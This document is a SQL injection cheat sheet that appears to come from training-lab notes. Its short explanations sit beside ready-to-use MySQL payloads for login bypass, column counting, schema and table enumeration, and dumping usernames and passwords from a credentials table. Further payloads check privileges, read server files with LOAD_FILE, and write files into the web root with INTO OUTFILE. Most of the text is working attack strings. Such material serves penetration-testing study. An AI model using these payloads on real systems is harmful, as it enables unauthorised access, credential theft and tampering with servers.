### Auth bypass via comments
`--` 
(This is a comment, beware of the space after the double dash)Sql_Injection
  
 `# `
 (This is a comment aswell, beware of the space after the Hashtag)
Example: `admin' --` 
`SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';`
(This should bypass the Auth form)

### Parentesis
Query with parenthesis have precedence over everything so we have to take care of them first
If we have a query like:
`SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = 'something';`
Using something `like:admin') --` 
(This should bypass the Auth form beware of the space after the hyphens)

### DB structure undercover
`' union select NULL,NULL,database()-- -`         
(get DB/Schema name)
`' union select NULL,NULL,gRoUp_cOncaT(table_name) fRoM information_schema.tables-- -`     
(get all tables in DB)
`' union select NULL,NULL,gRoUp_cOncaT(column_name) fRoM information_schema.columns where table_name='something'-- -`  
(get all columns in a table)

### Limit results (show example second row) 
`union all select NULL,NULL,name from customers LIMIT 1 OFFSET 1-- -`
(This will show the next row after the first one. Useful for manual fuzzing when only one row is returned)

#### Union Clause
The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.
A UNION statement can only operate on SELECT statements with an equal number of columns.

//Example:

```
mysql> SELECT * FROM ports;
+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)

mysql> SELECT * FROM ships;
+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)

mysql> SELECT * FROM ports UNION SELECT * FROM ships;
+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

#### Un-even Union Clause
A UNION statement can only operate on SELECT statements with an equal number of columns. To bypass this we can use "junk" columns to even the result between 2 tables.
When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. 
For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

Example: 
`SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords`
(The table Products return 2 columns where instead Password table return only one column so we Junked the second column with a 2 to make it even)
If we had more columns in the Products table we have to make it even by adding extra columns:

```
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+

```


### Find Table columns size(Order By)
We can archive that by using order by, and keep sending incremental until we get a error that column doesn't exist.

`' order by 1--` 
(Beware of space after double hyphens)
(If no errors are thrown this means we have one column at least, now we continue so)

```
' order by 2--
.
' order by 3-- 
..
' order by 4-- 
```
(If we get an error at 4 this means that the table have 4 columns)

### Find Table columns size(UNION)
`cn' UNION select 1,2,3,4-- -`
(If we don't get any error throws this mean that table have 4 columns size since we know that UNION need to match even number of columns)

### Union Injection
When we found the exact size of the table we can use UNION and get queries injected into same table. But again we have to match exact number of columns to make the result event.
Plus is very important to match the columns type as well, ex we cant dump a VARCHAR into a INT type column.

`cn' UNION select 1,@@version,3,4 --` 
(This will Get DB version in columns 2 this is a varchar)

### DB enumeration(via UNION)
`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA --` 
(This will dump the DB available)(Beware of space after comments)

`cn' UNION select 1,database(),2,3-- -`
(this will dump the current database)(Beware of space after comments)

`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev' --` 
(This will show tables from DB named dev)(Beware of space after comments)

`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials' --` 
(This wil show columns from table credentials in dev DB)(Beware of space after comments)

`cn' UNION select 1, username, password, 4 from dev.credentials --` 
(Lastly this will dump data from credentials table in DEV db)(Beware of space after comments)

### User Permission Enumeration (via UNION)
`cn' UNION SELECT 1, user(), 3, 4 --` 
(This will give back the current user)

`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user --` 
(This will check if user is super admin, a Y or N is returned. you can filter for specific user with WHERE user="root" -- )

`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges --` 
(This will check for specific permissions on the DB. Again here you can filter for specific user with WHERE user="root" -- )

### File Read (via UNION)
To make this work the current user must have FILE permissions active
`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4 --` 
(This will read a LOCAL file)

### FileWrite (via UNION)
To make this work we much match:

```
User with FILE privilege enabled
MySQL global secure_file_priv variable not enabled
Write access to the location we want to write to on the back-end server
```

1)Check for secure_file_priv
`SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
Example: `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv" --` 
(If result is void this mean is disabled and we can proceed)

2)Chek for FILE permissions
Example: `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges --` 
(If you see file than you can procede)

3)Write the file
Example: `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt' --` 
(This will write that payload into given path, you have to have filesystem write permission on that folder as well)